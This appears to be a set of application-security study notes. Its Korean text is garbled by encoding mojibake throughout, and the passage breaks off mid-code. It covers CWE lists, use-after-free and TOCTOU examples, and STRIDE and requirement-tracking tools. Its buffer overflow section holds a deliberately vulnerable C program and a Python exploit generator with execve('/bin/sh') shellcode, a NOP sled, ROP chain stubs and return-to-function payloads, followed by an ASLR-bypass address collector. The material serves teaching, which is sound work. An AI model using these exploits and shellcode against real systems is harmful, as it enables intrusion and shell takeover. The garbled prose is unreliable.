---
title: 04-ì‘ìš©í”„ë¡œê·¸ë¨-ë³´ì•ˆ
tags: []
aliases: []
date modified: 2026-01-01 22:59:14 +09:00
date created: 2025-12-16 20:25:15 +09:00
---

## 4. ì‘ìš©í”„ë¡œê·¸ë¨ ë³´ì•ˆ

### 4.1 ì†Œí”„íŠ¸ì›¨ì–´ ë³´ì•ˆ ì‹¬í™”

#### 4.1.1 ì†Œí”„íŠ¸ì›¨ì–´ ì·¨ì•½ì  ì‹¬í™” ë¶„ì„

##### CWE (Common Weakness Enumeration) ê¸°ë°˜ ë¶„ë¥˜

```
CWE Top 25 (2023ë…„ ê¸°ì¤€):
1. CWE-787: Out-of-bounds Write (ë²„í¼ ì˜¤ë²„í”Œë¡œ)
2. CWE-79: Cross-site Scripting (XSS)
3. CWE-89: SQL Injection
4. CWE-20: Improper Input Validation
5. CWE-125: Out-of-bounds Read
6. CWE-78: OS Command Injection
7. CWE-416: Use After Free
8. CWE-22: Path Traversal
9. CWE-352: Cross-Site Request Forgery (CSRF)
10. CWE-434: Unrestricted Upload of File
```

##### ê³ ê¸‰ ì†Œí”„íŠ¸ì›¨ì–´ ì·¨ì•½ì  ë¶„ì„

###### ë©”ëª¨ë¦¬ ì•ˆì „ì„± ì·¨ì•½ì 
```c
// Use-After-Free ì·¨ì•½ì  ì˜ˆì‹œ
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    int data;
    void (*function_ptr)(int);
} vulnerable_struct;

void safe_function(int value) {
    printf("Safe function called with: %d\n", value);
}

void dangerous_function(int value) {
    printf("Dangerous function called with: %d\n", value);
    // ì•…ì„± ì½”ë“œ ì‹¤í–‰ ê°€ëŠ¥
}

int main() {
    vulnerable_struct *ptr = malloc(sizeof(vulnerable_struct));
    ptr->data = 42;
    ptr->function_ptr = safe_function;

    // ì •ìƒì ì¸ ì‚¬ìš©
    ptr->function_ptr(ptr->data);

    // ë©”ëª¨ë¦¬ í•´ì œ
    free(ptr);

    // Use-After-Free ì·¨ì•½ì : í•´ì œëœ ë©”ëª¨ë¦¬ ì¬ì‚¬ìš©
    // ê³µê²©ìê°€ ì´ ì‹œì ì—ì„œ í™ì„ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤ë©´
    // ptr->function_ptrì„ dangerous_functionìœ¼ë¡œ ë³€ê²½ ê°€ëŠ¥
    ptr->function_ptr(ptr->data);  // ì·¨ì•½í•œ ì½”ë“œ

    return 0;
}
```

###### ê²½ìŸ ì¡°ê±´(Race Condition) ì·¨ì•½ì 
```c
// TOCTOU (Time-of-Check-Time-of-Use) ì·¨ì•½ì 
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

// ì·¨ì•½í•œ íŒŒì¼ ì ‘ê·¼ ì½”ë“œ
int vulnerable_file_access(const char *filename) {
    struct stat statbuf;

    // Check: íŒŒì¼ ê¶Œí•œ í™•ì¸
    if (stat(filename, &statbuf) != 0) {
        return -1;
    }

    // íŒŒì¼ ì†Œìœ ìê°€ í˜„ì¬ ì‚¬ìš©ìì¸ì§€ í™•ì¸
    if (statbuf.st_uid != getuid()) {
        printf("Permission denied\n");
        return -1;
    }

    // Use: íŒŒì¼ ì—´ê¸° (TOCTOU ê°­)
    // ì´ ì‹œì ì—ì„œ ê³µê²©ìê°€ ì‹¬ë³¼ë¦­ ë§í¬ë¡œ íŒŒì¼ì„ ë³€ê²½í•  ìˆ˜ ìˆìŒ
    int fd = open(filename, O_RDWR);
    if (fd == -1) {
        return -1;
    }

    // íŒŒì¼ ì‘ì—… ìˆ˜í–‰
    write(fd, "sensitive data", 14);
    close(fd);

    return 0;
}

// ì•ˆì „í•œ íŒŒì¼ ì ‘ê·¼ ì½”ë“œ
int secure_file_access(const char *filename) {
    // íŒŒì¼ì„ ë¨¼ì € ì—´ê¸°
    int fd = open(filename, O_RDWR | O_NOFOLLOW);
    if (fd == -1) {
        return -1;
    }

    struct stat statbuf;
    // ì—´ë¦° íŒŒì¼ ë””ìŠ¤í¬ë¦½í„°ì— ëŒ€í•´ stat ìˆ˜í–‰
    if (fstat(fd, &statbuf) != 0) {
        close(fd);
        return -1;
    }

    // ê¶Œí•œ í™•ì¸
    if (statbuf.st_uid != getuid()) {
        close(fd);
        printf("Permission denied\n");
        return -1;
    }

    // ì•ˆì „í•˜ê²Œ íŒŒì¼ ì‘ì—… ìˆ˜í–‰
    write(fd, "sensitive data", 14);
    close(fd);

    return 0;
}
```

##### SDLC ë³´ì•ˆ í†µí•© ê³ ê¸‰ ë°©ë²•ë¡ 

###### ìœ„í˜‘ ëª¨ë¸ë§ (Threat Modeling) ì‹¤ìŠµ
```python
# STRIDE ìœ„í˜‘ ëª¨ë¸ë§ ìë™í™” ë„êµ¬
import json
from dataclasses import dataclass
from typing import List, Dict
from enum import Enum

class ThreatType(Enum):
    SPOOFING = "Spoofing"           # ìŠ¤í‘¸í•‘
    TAMPERING = "Tampering"         # ë³€ì¡°
    REPUDIATION = "Repudiation"     # ë¶€ì¸
    INFORMATION_DISCLOSURE = "Information Disclosure"  # ì •ë³´ê³µê°œ
    DENIAL_OF_SERVICE = "Denial of Service"           # ì„œë¹„ìŠ¤ê±°ë¶€
    ELEVATION_OF_PRIVILEGE = "Elevation of Privilege" # ê¶Œí•œìƒìŠ¹

@dataclass
class Component:
    name: str
    type: str  # Process, Data Store, External Entity, Data Flow
    trust_level: int  # 1-5 (1=Low, 5=High)
    description: str

@dataclass
class Threat:
    threat_type: ThreatType
    target_component: str
    description: str
    impact: int  # 1-5
    likelihood: int  # 1-5
    mitigation: str

class ThreatModelingTool:
    def __init__(self, application_name: str):
        self.application_name = application_name
        self.components: List[Component] = []
        self.threats: List[Threat] = []
        self.mitigations: Dict[str, List[str]] = {}

    def add_component(self, component: Component):
        self.components.append(component)

    def analyze_threats(self):
        """STRIDE ë°©ë²•ë¡ ì„ ì‚¬ìš©í•œ ìœ„í˜‘ ë¶„ì„"""
        for component in self.components:
            self._analyze_component_threats(component)

    def _analyze_component_threats(self, component: Component):
        """êµ¬ì„±ìš”ì†Œë³„ STRIDE ìœ„í˜‘ ë¶„ì„"""

        if component.type == "Process":
            # í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•œ ëª¨ë“  STRIDE ìœ„í˜‘ ì ìš©
            self.threats.extend([
                Threat(
                    ThreatType.SPOOFING,
                    component.name,
                    f"ê³µê²©ìê°€ {component.name} í”„ë¡œì„¸ìŠ¤ë¡œ ìœ„ì¥",
                    4, 3,
                    "ê°•ë ¥í•œ ì¸ì¦ ë©”ì»¤ë‹ˆì¦˜ êµ¬í˜„ (ë‹¤ì¤‘ ì¸ì¦, ì¸ì¦ì„œ ê¸°ë°˜)"
                ),
                Threat(
                    ThreatType.TAMPERING,
                    component.name,
                    f"{component.name} í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ ë˜ëŠ” ì‹¤í–‰ íë¦„ ë³€ì¡°",
                    5, 2,
                    "ì½”ë“œ ë¬´ê²°ì„± ê²€ì¦, ASLR, DEP í™œì„±í™”"
                ),
                Threat(
                    ThreatType.REPUDIATION,
                    component.name,
                    f"{component.name}ì˜ ì‘ì—…ì— ëŒ€í•œ ë¶€ì¸",
                    3, 3,
                    "í¬ê´„ì  ë¡œê¹…, ë””ì§€í„¸ ì„œëª…, íƒ€ì„ìŠ¤íƒ¬í”„"
                ),
                Threat(
                    ThreatType.INFORMATION_DISCLOSURE,
                    component.name,
                    f"{component.name}ì˜ ë©”ëª¨ë¦¬ ë¤í”„ ë˜ëŠ” ë¡œê·¸ë¥¼ í†µí•œ ì •ë³´ ìœ ì¶œ",
                    4, 3,
                    "ë©”ëª¨ë¦¬ ì•”í˜¸í™”, ë¡œê·¸ ë§ˆìŠ¤í‚¹, ìµœì†Œ ê¶Œí•œ ì›ì¹™"
                ),
                Threat(
                    ThreatType.DENIAL_OF_SERVICE,
                    component.name,
                    f"{component.name} í”„ë¡œì„¸ìŠ¤ ì¤‘ë‹¨ ë˜ëŠ” ìì› ê³ ê°ˆ",
                    3, 4,
                    "ë¦¬ì†ŒìŠ¤ ì œí•œ, ì…ë ¥ ê²€ì¦, ë ˆì´íŠ¸ ë¦¬ë¯¸íŒ…"
                ),
                Threat(
                    ThreatType.ELEVATION_OF_PRIVILEGE,
                    component.name,
                    f"{component.name}ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹",
                    5, 3,
                    "ìµœì†Œ ê¶Œí•œ ì‹¤í–‰, ìƒŒë“œë°•ì‹±, ì •ê¸°ì  ê¶Œí•œ ê²€í† "
                )
            ])

        elif component.type == "Data Store":
            # ë°ì´í„° ì €ì¥ì†Œì— ëŒ€í•œ íŠ¹ì • ìœ„í˜‘
            self.threats.extend([
                Threat(
                    ThreatType.TAMPERING,
                    component.name,
                    f"{component.name} ë°ì´í„°ë² ì´ìŠ¤ ë¬´ë‹¨ ìˆ˜ì •",
                    5, 3,
                    "ë°ì´í„° ë¬´ê²°ì„± ê²€ì‚¬, ì•”í˜¸í™”, ì ‘ê·¼ ì œì–´"
                ),
                Threat(
                    ThreatType.INFORMATION_DISCLOSURE,
                    component.name,
                    f"{component.name}ì˜ ë¯¼ê°í•œ ë°ì´í„° ìœ ì¶œ",
                    5, 3,
                    "í•„ë“œ ë ˆë²¨ ì•”í˜¸í™”, ì ‘ê·¼ ë¡œê¹…, ë°ì´í„° ë¶„ë¥˜"
                ),
                Threat(
                    ThreatType.DENIAL_OF_SERVICE,
                    component.name,
                    f"{component.name} ê°€ìš©ì„± ê³µê²©",
                    3, 3,
                    "ë°±ì—…/ë³µêµ¬ ê³„íš, ë¡œë“œ ë°¸ëŸ°ì‹±, ëª¨ë‹ˆí„°ë§"
                )
            ])

        elif component.type == "Data Flow":
            # ë°ì´í„° íë¦„ì— ëŒ€í•œ íŠ¹ì • ìœ„í˜‘
            self.threats.extend([
                Threat(
                    ThreatType.TAMPERING,
                    component.name,
                    f"{component.name} í†µì‹  ì¤‘ ë°ì´í„° ë³€ì¡°",
                    4, 3,
                    "TLS/SSL, ë©”ì‹œì§€ ì¸ì¦ ì½”ë“œ (MAC), ë””ì§€í„¸ ì„œëª…"
                ),
                Threat(
                    ThreatType.INFORMATION_DISCLOSURE,
                    component.name,
                    f"{component.name} í†µì‹  ë„ì²­",
                    4, 4,
                    "ì¢…ë‹¨ê°„ ì•”í˜¸í™”, VPN, ë„¤íŠ¸ì›Œí¬ ì„¸ê·¸ë©˜í…Œì´ì…˜"
                ),
                Threat(
                    ThreatType.DENIAL_OF_SERVICE,
                    component.name,
                    f"{component.name} í†µì‹  ì°¨ë‹¨",
                    3, 3,
                    "DDoS ë°©ì–´, ì´ì¤‘í™” ê²½ë¡œ, QoS"
                )
            ])

    def calculate_risk_score(self, threat: Threat) -> int:
        """ìœ„í—˜ë„ ê³„ì‚° (Impact Ã— Likelihood)"""
        return threat.impact * threat.likelihood

    def prioritize_threats(self) -> List[Threat]:
        """ìœ„í—˜ë„ì— ë”°ë¥¸ ìœ„í˜‘ ìš°ì„ ìˆœìœ„í™”"""
        return sorted(self.threats,
                     key=lambda t: self.calculate_risk_score(t),
                     reverse=True)

    def generate_security_requirements(self) -> List[str]:
        """ìœ„í˜‘ ë¶„ì„ì„ ê¸°ë°˜ìœ¼ë¡œ ë³´ì•ˆ ìš”êµ¬ì‚¬í•­ ìƒì„±"""
        requirements = []
        high_risk_threats = [t for t in self.threats if self.calculate_risk_score(t) >= 15]

        for threat in high_risk_threats:
            requirements.append(f"REQ-{len(requirements)+1}: {threat.mitigation}")

        return requirements

    def export_report(self) -> str:
        """ìœ„í˜‘ ëª¨ë¸ë§ ë³´ê³ ì„œ ìƒì„±"""
        prioritized_threats = self.prioritize_threats()

        report = f"""
# ìœ„í˜‘ ëª¨ë¸ë§ ë³´ê³ ì„œ: {self.application_name}

## ì‹œìŠ¤í…œ êµ¬ì„±ìš”ì†Œ
"""
        for component in self.components:
            report += f"- **{component.name}** ({component.type}): {component.description}\n"

        report += "\n## ì‹ë³„ëœ ìœ„í˜‘ (ìœ„í—˜ë„ ìˆœ)\n"

        for threat in prioritized_threats:
            risk_score = self.calculate_risk_score(threat)
            report += f"""
### {threat.threat_type.value} - {threat.target_component}
- **ìœ„í—˜ë„**: {risk_score} (ì˜í–¥ë„: {threat.impact}, ê°€ëŠ¥ì„±: {threat.likelihood})
- **ì„¤ëª…**: {threat.description}
- **ì™„í™”ë°©ì•ˆ**: {threat.mitigation}
"""

        report += "\n## ë³´ì•ˆ ìš”êµ¬ì‚¬í•­\n"
        requirements = self.generate_security_requirements()
        for req in requirements:
            report += f"- {req}\n"

        return report

# ì‚¬ìš© ì˜ˆì‹œ
threat_model = ThreatModelingTool("E-Commerce ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜")

# êµ¬ì„±ìš”ì†Œ ì¶”ê°€
threat_model.add_component(Component(
    "ì›¹ ì„œë²„", "Process", 3,
    "ì‚¬ìš©ì ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” Apache/Nginx ì„œë²„"
))

threat_model.add_component(Component(
    "ë°ì´í„°ë² ì´ìŠ¤", "Data Store", 4,
    "ì‚¬ìš©ì ì •ë³´ ë° ì£¼ë¬¸ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” MySQL ë°ì´í„°ë² ì´ìŠ¤"
))

threat_model.add_component(Component(
    "HTTPS í†µì‹ ", "Data Flow", 3,
    "í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ ê°„ ì•”í˜¸í™”ëœ í†µì‹ "
))

# ìœ„í˜‘ ë¶„ì„ ì‹¤í–‰
threat_model.analyze_threats()

# ë³´ê³ ì„œ ìƒì„±
print(threat_model.export_report())
```

###### ë³´ì•ˆ ìš”êµ¬ì‚¬í•­ ì¶”ì ì„± ë§¤íŠ¸ë¦­ìŠ¤
```python
# ë³´ì•ˆ ìš”êµ¬ì‚¬í•­ ì¶”ì ì„± ê´€ë¦¬
from dataclasses import dataclass
from typing import List, Dict
from enum import Enum

class RequirementStatus(Enum):
    DRAFT = "Draft"
    APPROVED = "Approved"
    IMPLEMENTED = "Implemented"
    TESTED = "Tested"
    VERIFIED = "Verified"

class SecurityCategory(Enum):
    AUTHENTICATION = "Authentication"
    AUTHORIZATION = "Authorization"
    CRYPTOGRAPHY = "Cryptography"
    INPUT_VALIDATION = "Input Validation"
    SESSION_MANAGEMENT = "Session Management"
    ERROR_HANDLING = "Error Handling"
    LOGGING = "Logging"
    COMMUNICATION = "Communication"

@dataclass
class SecurityRequirement:
    id: str
    title: str
    description: str
    category: SecurityCategory
    priority: int  # 1-5 (5=Critical)
    status: RequirementStatus
    implementation_details: str = ""
    test_cases: List[str] = None
    verification_methods: List[str] = None

class SecurityRequirementTracker:
    def __init__(self, project_name: str):
        self.project_name = project_name
        self.requirements: Dict[str, SecurityRequirement] = {}
        self.test_coverage: Dict[str, List[str]] = {}

    def add_requirement(self, requirement: SecurityRequirement):
        self.requirements[requirement.id] = requirement

    def update_requirement_status(self, req_id: str, status: RequirementStatus):
        if req_id in self.requirements:
            self.requirements[req_id].status = status

    def add_test_case(self, req_id: str, test_case: str):
        if req_id in self.requirements:
            if self.requirements[req_id].test_cases is None:
                self.requirements[req_id].test_cases = []
            self.requirements[req_id].test_cases.append(test_case)

    def generate_coverage_report(self) -> str:
        report = f"# ë³´ì•ˆ ìš”êµ¬ì‚¬í•­ ì¶”ì ì„± ë³´ê³ ì„œ: {self.project_name}\n\n"

        # ì¹´í…Œê³ ë¦¬ë³„ í†µê³„
        category_stats = {}
        for req in self.requirements.values():
            category = req.category.value
            if category not in category_stats:
                category_stats[category] = {"total": 0, "implemented": 0, "tested": 0}

            category_stats[category]["total"] += 1
            if req.status in [RequirementStatus.IMPLEMENTED, RequirementStatus.TESTED, RequirementStatus.VERIFIED]:
                category_stats[category]["implemented"] += 1
            if req.status in [RequirementStatus.TESTED, RequirementStatus.VERIFIED]:
                category_stats[category]["tested"] += 1

        report += "## ì¹´í…Œê³ ë¦¬ë³„ êµ¬í˜„ í˜„í™©\n\n"
        for category, stats in category_stats.items():
            impl_rate = (stats["implemented"] / stats["total"]) * 100 if stats["total"] > 0 else 0
            test_rate = (stats["tested"] / stats["total"]) * 100 if stats["total"] > 0 else 0
            report += f"- **{category}**: êµ¬í˜„ë¥  {impl_rate:.1f}% ({stats['implemented']}/{stats['total']}), "
            report += f"í…ŒìŠ¤íŠ¸ìœ¨ {test_rate:.1f}% ({stats['tested']}/{stats['total']})\n"

        # ìš°ì„ ìˆœìœ„ë³„ í˜„í™©
        report += "\n## ìš°ì„ ìˆœìœ„ë³„ ìš”êµ¬ì‚¬í•­\n\n"
        priority_sorted = sorted(self.requirements.values(), key=lambda x: x.priority, reverse=True)

        current_priority = None
        for req in priority_sorted:
            if req.priority != current_priority:
                current_priority = req.priority
                priority_name = {5: "Critical", 4: "High", 3: "Medium", 2: "Low", 1: "Info"}
                report += f"\n### {priority_name.get(req.priority, 'Unknown')} Priority\n\n"

            status_emoji = {
                RequirementStatus.DRAFT: "ğŸ“",
                RequirementStatus.APPROVED: "âœ…",
                RequirementStatus.IMPLEMENTED: "ğŸ”§",
                RequirementStatus.TESTED: "ğŸ§ª",
                RequirementStatus.VERIFIED: "âœ”ï¸"
            }

            report += f"- {status_emoji.get(req.status, 'â“')} **{req.id}**: {req.title} ({req.status.value})\n"

        return report

# ë³´ì•ˆ ìš”êµ¬ì‚¬í•­ ì •ì˜ ì˜ˆì‹œ
tracker = SecurityRequirementTracker("Banking Web Application")

# Critical ë³´ì•ˆ ìš”êµ¬ì‚¬í•­
tracker.add_requirement(SecurityRequirement(
    "AUTH-001", "ë‹¤ì¤‘ ì¸ì¦ (MFA) êµ¬í˜„",
    "ëª¨ë“  ì‚¬ìš©ì ê³„ì •ì— ëŒ€í•´ SMS, TOTP, ë˜ëŠ” ìƒì²´ì¸ì¦ì„ í¬í•¨í•œ ë‹¤ì¤‘ ì¸ì¦ì„ êµ¬í˜„í•´ì•¼ í•¨",
    SecurityCategory.AUTHENTICATION, 5, RequirementStatus.APPROVED,
    implementation_details="Google Authenticator ë° SMS ê¸°ë°˜ OTP êµ¬í˜„",
    test_cases=["TC-AUTH-001: MFA í™œì„±í™” í…ŒìŠ¤íŠ¸", "TC-AUTH-002: MFA ìš°íšŒ ì‹œë„ í…ŒìŠ¤íŠ¸"]
))

tracker.add_requirement(SecurityRequirement(
    "CRYPTO-001", "ë¯¼ê° ë°ì´í„° ì•”í˜¸í™”",
    "ê°œì¸ì •ë³´ ë° ê¸ˆìœµ ì •ë³´ëŠ” AES-256 ì´ìƒì˜ ê°•ë ¥í•œ ì•”í˜¸í™”ë¡œ ì €ì¥ë˜ì–´ì•¼ í•¨",
    SecurityCategory.CRYPTOGRAPHY, 5, RequirementStatus.IMPLEMENTED,
    implementation_details="AES-256-GCM ì‚¬ìš©, AWS KMSë¥¼ í†µí•œ í‚¤ ê´€ë¦¬"
))

tracker.add_requirement(SecurityRequirement(
    "INPUT-001", "í¬ê´„ì  ì…ë ¥ ê²€ì¦",
    "ëª¨ë“  ì‚¬ìš©ì ì…ë ¥ì— ëŒ€í•´ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê¸°ë°˜ ê²€ì¦ì„ ìˆ˜í–‰í•´ì•¼ í•¨",
    SecurityCategory.INPUT_VALIDATION, 4, RequirementStatus.TESTED
))

# ë³´ê³ ì„œ ìƒì„±
print(tracker.generate_coverage_report())
```

#### 4.1.2 ë²„í¼ ì˜¤ë²„í”Œë¡œ (Buffer Overflow) ì‹¬í™” ë¶„ì„

##### ìŠ¤íƒ ê¸°ë°˜ ë²„í¼ ì˜¤ë²„í”Œë¡œ ì‹¤ìŠµ

###### ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œì™€ ìµìŠ¤í”Œë¡œì‡

```c
// ì·¨ì•½í•œ í”„ë¡œê·¸ë¨ (vulnerable.c)
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];  // 64ë°”ì´íŠ¸ ë²„í¼

    // ìœ„í—˜í•œ í•¨ìˆ˜: ê²½ê³„ ê²€ì‚¬ ì—†ìŒ
    strcpy(buffer, input);

    printf("Input received: %s\n", buffer);
}

void secret_function() {
    printf("ğŸš¨ Secret function executed! Shell compromised!\n");
    system("/bin/sh");  // ì‰˜ ì‹¤í–‰
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    printf("Buffer address: %p\n", &main);
    printf("Secret function address: %p\n", &secret_function);

    vulnerable_function(argv[1]);

    printf("Program finished normally.\n");
    return 0;
}
```

###### ë²„í¼ ì˜¤ë²„í”Œë¡œ ìµìŠ¤í”Œë¡œì‡ êµ¬í˜„

```python
# Buffer Overflow Exploit Generator
import struct
import subprocess
import os

class BufferOverflowExploit:
    def __init__(self, target_binary, buffer_size=64):
        self.target_binary = target_binary
        self.buffer_size = buffer_size
        self.architecture = self.detect_architecture()

    def detect_architecture(self):
        """ë°”ì´ë„ˆë¦¬ ì•„í‚¤í…ì²˜ ê°ì§€"""
        try:
            result = subprocess.run(['file', self.target_binary],
                                  capture_output=True, text=True)
            if '32-bit' in result.stdout:
                return 32
            elif '64-bit' in result.stdout:
                return 64
        except:
            pass
        return 64  # ê¸°ë³¸ê°’

    def find_offset(self):
        """RIP/EIP ì˜¤ë²„ë¼ì´íŠ¸ ì˜¤í”„ì…‹ ì°¾ê¸°"""
        print("Finding buffer overflow offset...")

        # íŒ¨í„´ ìƒì„± (De Bruijn sequence)
        pattern = self.generate_pattern(200)

        try:
            # íŒ¨í„´ìœ¼ë¡œ í”„ë¡œê·¸ë¨ ì‹¤í–‰
            result = subprocess.run([self.target_binary, pattern],
                                  capture_output=True, text=True, timeout=5)
        except subprocess.TimeoutExpired:
            print("Program crashed - analyzing core dump...")

        # ì‹¤ì œ í™˜ê²½ì—ì„œëŠ” ë””ë²„ê±°ë¥¼ ì‚¬ìš©í•´ ì •í™•í•œ ì˜¤í”„ì…‹ì„ ì°¾ì•„ì•¼ í•¨
        # ì—¬ê¸°ì„œëŠ” ì¼ë°˜ì ì¸ ìŠ¤íƒ í”„ë ˆì„ êµ¬ì¡°ë¥¼ ê°€ì •
        return self.buffer_size + 8  # ë²„í¼ + ìŠ¤íƒ í”„ë ˆì„ í¬ì¸í„°

    def generate_pattern(self, length):
        """De Bruijn íŒ¨í„´ ìƒì„±"""
        alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        pattern = ""
        for i in range(length):
            pattern += alphabet[i % len(alphabet)]
        return pattern

    def create_shellcode(self):
        """í”Œë«í¼ë³„ ì‰˜ì½”ë“œ ìƒì„±"""
        if self.architecture == 64:
            # x86_64 execve("/bin/sh") shellcode
            shellcode = (
                b"\x48\x31\xf6"                # xor rsi, rsi
                b"\x56"                        # push rsi
                b"\x48\xbf\x2f\x62\x69\x6e"    # movabs rdi, 0x68732f6e69622f
                b"\x2f\x73\x68\x00"
                b"\x57"                        # push rdi
                b"\x48\x89\xe7"                # mov rdi, rsp
                b"\x48\x31\xd2"                # xor rdx, rdx
                b"\x48\x31\xc0"                # xor rax, rax
                b"\xb0\x3b"                    # mov al, 59
                b"\x0f\x05"                    # syscall
            )
        else:
            # x86 execve("/bin/sh") shellcode
            shellcode = (
                b"\x31\xc0"                    # xor eax, eax
                b"\x50"                        # push eax
                b"\x68\x2f\x2f\x73\x68"        # push 0x68732f2f
                b"\x68\x2f\x62\x69\x6e"        # push 0x6e69622f
                b"\x89\xe3"                    # mov ebx, esp
                b"\x50"                        # push eax
                b"\x53"                        # push ebx
                b"\x89\xe1"                    # mov ecx, esp
                b"\xb0\x0b"                    # mov al, 11
                b"\xcd\x80"                    # int 0x80
            )

        return shellcode

    def create_rop_chain(self, target_function_addr):
        """ROP ì²´ì¸ ìƒì„± (DEP/NX ìš°íšŒ)"""
        if self.architecture == 64:
            # x86_64 ROP gadgets (ì‹¤ì œë¡œëŠ” ë°”ì´ë„ˆë¦¬ì—ì„œ ì°¾ì•„ì•¼ í•¨)
            rop_chain = b""
            rop_chain += struct.pack("<Q", 0x400123)  # pop rdi; ret
            rop_chain += struct.pack("<Q", target_function_addr)
            rop_chain += struct.pack("<Q", 0x400456)  # ret (alignment)
        else:
            # x86 ROP gadgets
            rop_chain = b""
            rop_chain += struct.pack("<I", target_function_addr)

        return rop_chain

    def generate_exploit(self, target_function_addr=None, use_shellcode=False):
        """ìµìŠ¤í”Œë¡œì‡ í˜ì´ë¡œë“œ ìƒì„±"""
        offset = self.find_offset()

        # ê¸°ë³¸ íŒ¨ë”©
        payload = b"A" * offset

        if use_shellcode:
            # ì‰˜ì½”ë“œ ì‚¬ìš© (NX ë¹„í™œì„±í™”ëœ ê²½ìš°)
            shellcode = self.create_shellcode()

            # NOP sled + shellcode
            nop_sled = b"\x90" * 32
            payload = nop_sled + shellcode + b"A" * (offset - len(nop_sled) - len(shellcode))

            # ìŠ¤íƒ ì£¼ì†Œë¡œ ë¦¬í„´ (ì‹¤ì œë¡œëŠ” ë™ì ìœ¼ë¡œ ì°¾ì•„ì•¼ í•¨)
            stack_addr = 0x7ffe12345678  # ì˜ˆì‹œ ì£¼ì†Œ
            if self.architecture == 64:
                payload += struct.pack("<Q", stack_addr)
            else:
                payload += struct.pack("<I", stack_addr)

        elif target_function_addr:
            # Return-to-function ê³µê²©
            if self.architecture == 64:
                payload += struct.pack("<Q", target_function_addr)
            else:
                payload += struct.pack("<I", target_function_addr)
        else:
            # í¬ë˜ì‹œ í…ŒìŠ¤íŠ¸ìš©
            payload += b"BBBB" if self.architecture == 32 else b"BBBBBBBB"

        return payload

    def test_exploit(self, payload):
        """ìµìŠ¤í”Œë¡œì‡ í…ŒìŠ¤íŠ¸"""
        print(f"Testing payload (length: {len(payload)})")
        print(f"Payload preview: {payload[:50]}...")

        try:
            result = subprocess.run([self.target_binary, payload],
                                  capture_output=True, timeout=5)
            print(f"Exit code: {result.returncode}")
            print(f"Output: {result.stdout.decode()}")

            if result.returncode < 0:
                print(f"ğŸ¯ Process crashed with signal {-result.returncode}")

        except subprocess.TimeoutExpired:
            print("ğŸš¨ Process hanging - possible shell spawned!")
        except Exception as e:
            print(f"Error: {e}")

# ì‚¬ìš© ì˜ˆì‹œ
def demonstrate_buffer_overflow():
    # ë¨¼ì € ì·¨ì•½í•œ í”„ë¡œê·¸ë¨ì„ ì»´íŒŒì¼í•´ì•¼ í•¨
    # gcc -fno-stack-protector -z execstack -g vulnerable.c -o vulnerable

    exploit = BufferOverflowExploit("./vulnerable")

    # 1. í¬ë˜ì‹œ í…ŒìŠ¤íŠ¸
    crash_payload = exploit.generate_exploit()
    print("=== Crash Test ===")
    exploit.test_exploit(crash_payload)

    # 2. Return-to-function ê³µê²©
    # secret_function ì£¼ì†Œë¥¼ ì°¾ì•„ì•¼ í•¨ (objdump -d vulnerable | grep secret)
    secret_addr = 0x401234  # ì‹¤ì œ ì£¼ì†Œë¡œ êµì²´
    function_payload = exploit.generate_exploit(target_function_addr=secret_addr)
    print("\n=== Return-to-Function Attack ===")
    exploit.test_exploit(function_payload)

    # 3. ì‰˜ì½”ë“œ ì‹¤í–‰ (NX ë¹„í™œì„±í™”ëœ ê²½ìš°)
    shellcode_payload = exploit.generate_exploit(use_shellcode=True)
    print("\n=== Shellcode Execution ===")
    exploit.test_exploit(shellcode_payload)

# demonstrate_buffer_overflow()
```

##### ê³ ê¸‰ ë°©ì–´ ê¸°ë²• ë¶„ì„

###### ìŠ¤íƒ ì¹´ë‚˜ë¦¬ (Stack Canary) ìš°íšŒ ê¸°ë²•

```c
// ìŠ¤íƒ ì¹´ë‚˜ë¦¬ê°€ ìˆëŠ” ì½”ë“œ
#include <stdio.h>
#include <string.h>

void canary_protected_function() {
    char buffer[64];

    printf("Enter input: ");
    gets(buffer);  // ì—¬ì „íˆ ì·¨ì•½í•˜ì§€ë§Œ ì¹´ë‚˜ë¦¬ë¡œ ë³´í˜¸ë¨

    printf("You entered: %s\n", buffer);
}

// ì¹´ë‚˜ë¦¬ ìš°íšŒ ë°©ë²•:
// 1. í¬ë§· ìŠ¤íŠ¸ë§ìœ¼ë¡œ ì¹´ë‚˜ë¦¬ ê°’ ìœ ì¶œ
// 2. ë¸Œë£¨íŠ¸í¬ìŠ¤ ê³µê²© (fork ì„œë²„ í™˜ê²½)
// 3. ìŠ¤íƒ ê¸°ë°˜ì´ ì•„ë‹Œ í™ ì˜¤ë²„í”Œë¡œ ì‚¬ìš©
```

###### ASLR ìš°íšŒ ê¸°ë²•

```python
# ASLR ìš°íšŒë¥¼ ìœ„í•œ ì •ë³´ ìˆ˜ì§‘
import subprocess
import re

class ASLRBypass:
    def __init__(self, target_binary):
        self.target_binary = target_binary
        self.base_addresses = []

    def collect_base_addresses(self, iterations=100):
        """í”„ë¡œì„¸ìŠ¤ ì‹¤í–‰ ì‹œ ë² ì´ìŠ¤ ì£¼ì†Œ ìˆ˜ì§‘"""
        for i in range(iterations):
            try:
                # /proc/PID/mapsë¥¼ í†µí•œ ì£¼ì†Œ ì •ë³´ ìˆ˜ì§‘
                proc = subprocess.Popen([self.target_binary],
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE)

                # maps íŒŒì¼ ì½ê¸°
                maps_path = f"/proc/{proc.pid}/maps"
                with open(maps_path, 'r') as f:
                    maps_content = f.read()

                # ì‹¤í–‰ ê°€ëŠ¥í•œ ì„¸ê·¸ë¨¼íŠ¸ ì£¼ì†Œ ì¶”ì¶œ
                executable_regions = re.findall(r'^([0-9a-f]+)-[0-9a-f]+ r.xp',
                                              maps_content, re.MULTILINE)

                if executable_regions:
